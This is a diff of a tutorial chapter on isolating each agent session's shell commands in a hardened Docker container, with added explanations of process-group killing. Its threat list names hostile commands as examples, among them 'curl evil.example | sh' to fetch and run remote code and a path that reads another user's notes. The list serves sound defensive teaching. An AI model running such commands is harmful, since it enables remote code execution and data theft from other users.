@@ -41,6 +41,15 @@ The root check of `LocalEnv` keeps the *file* tools (`read`, `write`, `edit`, `l
 
 For one person on a laptop, this is fine: it is their own machine. For Ana and Bob together, it is not. Each session's commands must run in a closed box, apart from the server and from each other. That box is a **[sandbox](glossary.md#sandbox)**. We build it with Docker: a **[container](glossary.md#container)** is a process that sees its own files, its own users and its own limits, started from a ready-made image. It shares the host's kernel, so it starts in about a second, much faster than a full virtual machine.
 
+When we start the box, one Docker flag closes each door from above:
+
+- `cat ../<bob's session>/notes.txt` → the box only sees its own folder at `/work`, and `--user 1000:1000` means no root.
+- `curl evil.example | sh` → `--network none`: the box has no network.
+- the fork bomb → `--pids-limit 256`, `--memory 1g`, `--cpus 1`: the box cannot fill the machine.
+- changing system files or gaining powers → `--read-only`, `--cap-drop ALL`, `--security-opt no-new-privileges`.
+
+The full table, with every flag, is in [DockerSandbox.open](#dockersandboxopen-one-hardened-container-per-session).
+
 ## Starting point: 28's server and LocalSandbox
 
 Here is the real `LocalSandbox.open` the server uses today (`server.py`, trimmed):
@@ -150,23 +159,27 @@ def _cwd(self, cwd: str) -> str:
     return str(Path("/work") / rel)
 ```
 
-**Running and killing a command.** In [12](12-exec-env.md#step-5-stop-kills-the-whole-process-group), `LocalEnv` starts the shell in a new process group and kills the whole group on timeout. Here the command runs inside the container, where the host cannot see its pid. So we ask the box to tell us:
+**Running and killing a command.** First the idea in plain words. A command can start other programs: `python fizzbuzz.py; sleep 30` makes a shell, and the shell starts `python`, then `sleep`. These are its *child processes*. If we kill only the shell, the children keep running. So we start the command as the *leader* of its own group, and on timeout we kill the whole group with one call. This is the same idea as [12](12-exec-env.md#step-5-stop-kills-the-whole-process-group), where `LocalEnv` does it on the host. The new part: the command runs inside the container, and the host cannot see its pid (process id, the number of a running program). So we ask the box to tell us:
 
 Real code: [sandboxes/docker.py](../../apps/server/src/simp_server/sandboxes/docker.py) — `DockerEnv.exec`
 
 ```text
 proc = START docker exec -w _cwd(cwd) <container>
            setsid -w sh -c 'echo $$; exec sh -c "<command>" 2>&1'
-pid = first line of output
+           // setsid: the shell becomes the leader of a new group, so its pid is also the group id
+           // echo $$: print that pid as the first line, so we know which group to kill
+           // 2>&1:    errors go into the same stream, after the pid line
+pid = first line of output                // keep it, do not show it to the user
 ... same pump loop as LocalEnv.exec: read chunks, call on_output,
     stop at done, cancel or timeout ...
 IF not done:
     IF pid is a number: RUN docker exec <container> kill -9 -- -<pid>
+                                          // "-<pid>" with a minus = the whole group, not one process
     IF host docker exec still alive: kill it
     RETURN (none, output so far)
 ```
 
-`setsid` makes the shell the leader of a new process group inside the box, so its pid is also the group id. `echo $$` prints that pid as the first line, and we keep it apart from the output. `2>&1` sits inside the box on purpose: Docker carries stderr as its own stream, and an early error line could arrive before the pid line. On timeout, `kill -9 -- -<pid>` (note the minus: "the group") runs inside the box and kills the shell and every child.
+Why `2>&1` inside the box: Docker carries errors as a separate stream, and an early error line could arrive before the pid line. The kill also runs inside the box, because only there does the group id mean something.
 
 **Worked example.** Ana's agent runs `python fizzbuzz.py; sleep 30` with a 5 second timeout.
 
